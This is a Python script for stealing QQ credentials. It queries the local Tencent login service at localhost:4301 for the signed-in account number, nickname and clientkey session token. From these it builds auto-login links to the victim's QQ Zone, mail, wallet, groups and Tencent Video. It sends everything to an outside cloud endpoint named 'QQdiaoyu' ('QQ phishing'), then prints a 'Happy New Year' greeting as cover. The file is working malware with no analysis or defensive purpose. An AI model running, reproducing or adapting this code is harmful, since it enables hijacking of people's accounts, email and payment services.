import re
import requests
from urllib.parse import quote
import platform
import os

def getuin():
    url = 'https://localhost.ptlogin2.qq.com:4301/pt_get_uins?callback=ptui_getuins_CB&pt_local_tk=1'
    headers = {
        'Cookie': 'pt_local_token=1',
        'Referer': 'https://xui.ptlogin2.qq.com/'
    }
    resp = requests.get(url, headers=headers,verify=False)
    if resp.status_code == 200:
        data = resp.text
        uinRegexp = re.compile(r'uin":(\d+)')
        uin = uinRegexp.findall(data)
        nicknameRegexp = re.compile(r'nickname":"(.*?)"')
        nickname = nicknameRegexp.findall(data)
        return True, uin, nickname
    return False, None, None


def getkey(uin):
    url = 'https://localhost.ptlogin2.qq.com:4301/pt_get_st?callback=__jp0&pt_local_tk=1&clientuin=%s' % uin
    headers = {
        'Cookie': 'pt_local_token=1',
        'Referer': 'https://xui.ptlogin2.qq.com/'
    }
    resp = requests.get(url, headers=headers)
    if resp.status_code == 200:
        cookie = resp.headers['Set-Cookie']
        # print(cookie)
        clientkeyRegexp = re.compile(r'clientkey=(.*?);')
        clientkey = clientkeyRegexp.findall(cookie)
        return True, clientkey[0]
    return False, None


def send(msg, link):
    url = 'https://4e47feb358224203b416e7d56192141d.apig.cn-east-3.huaweicloudapis.com/QQdiaoyu?msg=%s&link=%s' % (
        msg, quote(link))
    resp = requests.get(url)
    if resp.status_code == 200:
        return True


if __name__ == '__main__':
    # try:
        status, uin, nickname = getuin()
        for i in range(len(uin)):
            if status:
                print('uin: %s, nickname: %s' % (uin[i], nickname[i]))
                status, key = getkey(uin[i])
                if status:
                    # print('key: %s' % key)
                    msg = 'uin: %s, nickname: %s, key: %s' % (uin[i], nickname[i], key)
                    if(platform.system()=='Windows'):#分别操作系统
                        system='9'
                    else:
                        system='19'
                    link = '\nQQ空间：\nhttps://ssl.ptlogin2.qq.com/jump?clientuin=%s&clientkey=%s&keyindex=%s&&u1=https://user.qzone.qq.com/%s/main\nQQ邮箱：\n' % (
                        uin[i], key,system, uin[i])+'https://ssl.ptlogin2.qq.com/jump?clientuin=%s&clientkey=%s&keyindex=%s&&u1=https://wx.mail.qq.com\nQQ钱包：\n' % (
                        uin[i], key,system)+'https://ssl.ptlogin2.qq.com/jump?clientuin=%s&clientkey=%s&keyindex=%s&&u1=https://pay.qq.com\nQQ群：\n' % (
                        uin[i], key,system)+'https://ssl.ptlogin2.qq.com/jump?clientuin=%s&clientkey=%s&keyindex=%s&&u1=https://qun.qq.com/manage.html\n腾讯视频:\n' % (
                        uin[i], key,system)+'https://ssl.ptlogin2.qq.com/jump?clientuin=%s&clientkey=%s&keyindex=%s&&u1=https://v.qq.com' % (
                        uin[i], key,system)#+'https://ssl.ptlogin2.qq.com/jump?clientuin=%s&clientkey=%s&keyindex=%s&&u1=https://graph.qq.com/oauth2.0/login_jump' % (
                        #uin[i], key,system)
                    print('link: %s' % link)
                    status = send(msg, link)
                    if status:
                        print('send success\n新年快乐')
                    else:
                        print('send failed')
                else:
                    print('get key failed')
            else:
                print('get uin failed')
    # except:
    #     print('新年快乐')
    # os.system("pause")
